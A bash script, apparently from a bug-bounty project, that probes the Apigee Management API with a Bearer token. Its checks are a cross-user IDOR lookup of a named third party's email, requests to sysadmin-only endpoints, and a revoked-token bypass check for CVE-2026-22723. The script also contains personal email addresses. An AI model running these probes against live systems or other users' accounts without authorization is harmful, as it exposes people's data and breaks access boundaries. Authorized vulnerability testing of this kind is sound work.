#!/bin/bash
# Management API IDOR probe using a pre-obtained Bearer token
# Run AFTER getting token via passcode flow or browser DevTools
# Usage: export APIGEE_TOKEN="..." && bash scripts/apigee_mgmt_token_probe.sh
export PATH="/usr/bin:/usr/local/bin:/usr/sbin:/bin:$PATH"

APIGEE_EMAIL="${APIGEE_EMAIL:-zahinshahriar3@gmail.com}"
TOKEN="${APIGEE_TOKEN:-}"
MGMT="https://api.enterprise.apigee.com"

OUTDIR="$HOME/bug-bounty-hunting-/results/apigee/03-candidates"
mkdir -p "$OUTDIR"
OUT="$OUTDIR/APG-L003-mgmt-bearer-probe.txt"

if [ -z "$TOKEN" ]; then
  echo "ERROR: Set APIGEE_TOKEN env var first."
  echo "Get token via: https://login.apigee.com/passcode → use passcode in:"
  echo '  curl -X POST https://login.apigee.com/oauth/token -u edgecli:edgeclisecret \'
  echo '       -d "grant_type=password&passcode=XXXX" | python3 -m json.tool'
  exit 1
fi

echo "=== Management API Bearer Token Probe ===" | tee "$OUT"
echo "Date: $(date -u)" | tee -a "$OUT"
echo "Token: ${TOKEN:0:30}..." | tee -a "$OUT"
echo | tee -a "$OUT"

# 1. Validate token — own user profile
echo "--- /v1/users/{own} (baseline) ---" | tee -a "$OUT"
OWN=$(/usr/bin/curl -sk --max-time 10 \
  -H "Authorization: Bearer $TOKEN" \
  -H "Accept: application/json" \
  -w "\nHTTP_%{http_code}" \
  "${MGMT}/v1/users/${APIGEE_EMAIL}")
echo "$OWN" | tee -a "$OUT"
echo | tee -a "$OUT"

if ! echo "$OWN" | /usr/bin/grep -q "HTTP_200"; then
  echo "Token invalid or expired. Refresh via passcode flow." | tee -a "$OUT"
  exit 1
fi

# 2. Cross-user IDOR — single probe (CLAUDE.md §7)
echo "--- /v1/users/{other} IDOR probe ---" | tee -a "$OUT"
IDOR_EMAIL="srinandans@google.com"
echo "Probing: $IDOR_EMAIL" | tee -a "$OUT"
/usr/bin/curl -sk --max-time 10 \
  -H "Authorization: Bearer $TOKEN" \
  -H "Accept: application/json" \
  -w "\nHTTP_%{http_code}" \
  "${MGMT}/v1/users/${IDOR_EMAIL}" | tee -a "$OUT"
echo | tee -a "$OUT"

# 3. Global org list (sysadmin only)
echo "--- /v1/organizations (global — should be 403) ---" | tee -a "$OUT"
/usr/bin/curl -sk --max-time 10 \
  -H "Authorization: Bearer $TOKEN" \
  -H "Accept: application/json" \
  -w "\nHTTP_%{http_code}" \
  "${MGMT}/v1/organizations" | tee -a "$OUT"
echo | tee -a "$OUT"

# 4. Global user list (sysadmin only)
echo "--- /v1/users (list all — should be 403) ---" | tee -a "$OUT"
/usr/bin/curl -sk --max-time 10 \
  -H "Authorization: Bearer $TOKEN" \
  -H "Accept: application/json" \
  -w "\nHTTP_%{http_code}" \
  "${MGMT}/v1/users" | tee -a "$OUT"
echo | tee -a "$OUT"

# 5. Global userroles
echo "--- /v1/userroles ---" | tee -a "$OUT"
/usr/bin/curl -sk --max-time 10 \
  -H "Authorization: Bearer $TOKEN" \
  -H "Accept: application/json" \
  -w "\nHTTP_%{http_code}" \
  "${MGMT}/v1/userroles" | tee -a "$OUT"
echo | tee -a "$OUT"

# 6. Token introspection (get JTI for revocation test)
echo "--- /check_token (introspection + JTI) ---" | tee -a "$OUT"
CHECK=$(/usr/bin/curl -sk --max-time 10 \
  -u "edgecli:edgeclisecret" \
  -X POST "https://login.apigee.com/check_token" \
  -d "token=${TOKEN}")
echo "$CHECK" | python3 -m json.tool 2>/dev/null | tee -a "$OUT"
JTI=$(echo "$CHECK" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('jti',''))" 2>/dev/null)
echo "JTI: $JTI" | tee -a "$OUT"
echo | tee -a "$OUT"

# 7. Token revocation bypass (CVE-2026-22723)
if [ -n "$JTI" ]; then
  echo "--- Token revocation bypass test (CVE-2026-22723) ---" | tee -a "$OUT"
  echo "Pre-revoke: verify token works..." | tee -a "$OUT"
  PRE=$(/usr/bin/curl -sk --max-time 10 -H "Authorization: Bearer $TOKEN" \
    -w "HTTP_%{http_code}" "https://login.apigee.com/userinfo" -o /dev/null)
  echo "Pre-revoke: $PRE" | tee -a "$OUT"

  echo "Revoking token..." | tee -a "$OUT"
  /usr/bin/curl -sk --max-time 10 \
    -H "Authorization: Bearer $TOKEN" \
    -X DELETE "https://login.apigee.com/oauth/token/revoke/${JTI}" \
    -w "Revoke HTTP: %{http_code}" | tee -a "$OUT"
  echo | tee -a "$OUT"

  echo "Post-revoke: token should be 401 now..." | tee -a "$OUT"
  POST=$(/usr/bin/curl -sk --max-time 10 -H "Authorization: Bearer $TOKEN" \
    -w "HTTP_%{http_code}" "https://login.apigee.com/userinfo" -o /dev/null)
  echo "Post-revoke: $POST" | tee -a "$OUT"

  if echo "$POST" | /usr/bin/grep -q "200"; then
    echo "*** CVE-2026-22723 CONFIRMED: revoked token still works! ***" | tee -a "$OUT"
  else
    echo "Token properly invalidated after revocation." | tee -a "$OUT"
  fi
fi

echo | tee -a "$OUT"
echo "=== VERDICT ===" | tee -a "$OUT"
echo "Check results above. Key findings:" | tee -a "$OUT"
echo "- /v1/users/{other} 200 = IDOR → report immediately" | tee -a "$OUT"
echo "- /v1/organizations 200 = priv esc → report immediately" | tee -a "$OUT"
echo "- revoked token 200 = CVE-2026-22723 → report" | tee -a "$OUT"
echo
echo "Done. Results: $OUT"
